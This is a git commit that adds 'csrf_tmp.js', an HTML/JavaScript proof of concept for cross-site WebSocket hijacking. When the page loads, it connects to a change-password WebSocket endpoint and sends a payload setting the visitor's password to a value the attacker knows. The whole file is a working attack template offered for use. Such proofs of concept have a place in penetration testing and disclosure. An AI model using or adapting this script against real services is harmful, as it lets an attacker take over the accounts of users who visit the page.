87d5e422664f31e456e48416b33d8f82d59e6d81
Filippo *ZinzlouN* Bersani <filobers@protonmail.com>
2024-05-17 14:34:04 +0200

    Create csrf_tmp.js

---
+++ csrf_tmp.js
@@ -0,0 +1,68 @@
+<code>
+  <title>CSRF Web socket POC</title>
+ <script language="javascript" type="text/javascript">
+
+  //URL points to the local listener + WS endpoint
+  var wsUri = "http://127.0.0.1:3333/change-password"; 
+  var output;
+
+  function init()
+  {
+    output = document.getElementById("output");
+    testWebSocket();
+  }
+
+  function testWebSocket()
+  {
+    websocket = new WebSocket(wsUri);
+    websocket.onopen = function(evt) { onOpen(evt) };
+    websocket.onclose = function(evt) { onClose(evt) };
+    websocket.onmessage = function(evt) { onMessage(evt) };
+    websocket.onerror = function(evt) { onError(evt) };
+  }
+
+  function onOpen(evt)
+  {
+    writeToScreen("CONNECTED");
+    //Payload to change the password
+    doSend("{\"npass\":\"Pwd1234\",\"cpass\":\"Pwd1234\"}");   
+  }
+
+  function onClose(evt)
+  {
+    writeToScreen("DISCONNECTED");
+  }
+
+  function onMessage(evt)
+  {
+    writeToScreen('<span style="color: blue;">RESPONSE: ' + evt.data+'</span>');
+    websocket.close();
+  }
+
+  function onError(evt)
+  {
+    writeToScreen('<span style="color: red;">ERROR:</span> ' + evt.data);
+  }
+
+  function doSend(message)
+  {
+    writeToScreen("SENT: " + message);
+    websocket.send(message);
+  }
+
+  function writeToScreen(message)
+  {
+    var pre = document.createElement("p");
+    pre.style.wordWrap = "break-word";
+    pre.innerHTML = message;
+    output.appendChild(pre);
+  }
+
+  window.addEventListener("load", init, false);
+
+  </script>
+
+  <h2>CSRF Websocket POC</h2>
+
+  <div id="output"></div>
+  </code>
